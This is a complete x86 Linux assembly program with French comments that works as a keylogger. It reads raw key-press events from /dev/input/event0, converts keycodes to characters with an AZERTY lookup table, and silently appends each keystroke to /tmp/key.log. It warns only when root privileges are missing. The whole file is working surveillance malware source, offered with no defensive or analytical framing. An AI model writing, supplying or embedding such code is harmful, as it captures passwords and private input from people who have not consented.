global _start

section .text
_start:

    xor ecx, ecx
    mov eax, 5            ; sys_open
    mov ebx, event_keyboard
    int 0x80

    mov esi, eax 

    mov eax, 5            ; sys_open
    mov edx, 420          ; 644
    mov ecx, 2101o        ; O_WRONLY | O_CREAT | O_APPEND
    mov ebx, output_file
    int 0x80

    cmp eax, -13   ; EACCES - Permission Denied - code d'erreur -13
    je erreur      ; jump si registre eax du syscall open = -13

    mov edi, eax 

input:

    mov eax, 3                      ; sys_read
    mov edx, 16                     ; 16 bytes
    mov ecx, input_event
    mov ebx, esi                    ; File descriptor pour lire bytes
    int 0x80

    mov byte al, [input_event + 8]  ; event.type
    cmp ax, 0x01                    ;  event.type(EV_KEY) = 1 -> https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h#L39
    jne input         ; jump not equal

    mov byte al, [input_event + 12] ; event.value
    cmp al, 1                       ; event.value = 1 -> event_value de EV_KEY = 1 -> keypress, 0 for key release
    jne input         ; jump equal

    mov byte al, [ecx + 10]         ; event.code (valeur en hexa de la touche du clavier)
    mov byte bl, [ascii + eax]    ; utiliser cette valeur comme index dans notre string qui représente notre clavier pour trouver la touche du clavier
    push ebx  


    mov eax, 4                      ; sys_write
    mov edx, 1                      ; longueur du syscall write 1 byte
    mov ecx, esp                    ; écris le caractère
    mov ebx, edi
    int 0x80

    pop eax                         ; supp le caractère de la stack

    jmp input

    mov eax, 1              ; sys_exit
    mov ebx, 0              ; 0 = sortie normale
    int 0x80



erreur:
    mov eax, 4              ; sys_write
    mov ebx, 2              ; stderr
    mov ecx, errMsg
    mov edx, lenErrMsg
    int 0x80

    mov eax, 1              ; sys_exit
    mov ebx, 0
    int 0x80
    ret


section .data
    event_keyboard db "/dev/input/event0", 0
    output_file   db "/tmp/key.log", 0
    errMsg db "Besoin des privilèges du superUtilisateur", 0xa
    lenErrMsg equ $ - errMsg
    ascii db `??1234567890)=\b\tazertyuiop??\n?qsdfghjklm???<wxcvbn,./!??? `    ; toucle clavier, ? représente touches non traduisables comme verrouillage maj

section .bss
    input_event resb 16    ; 16 bytes récupérer en hexadécimal ( 8 premiers -> temps etc ... -> 2 suivant = event type -> 2 suivant = code type -> 4 suivant = valeur input)
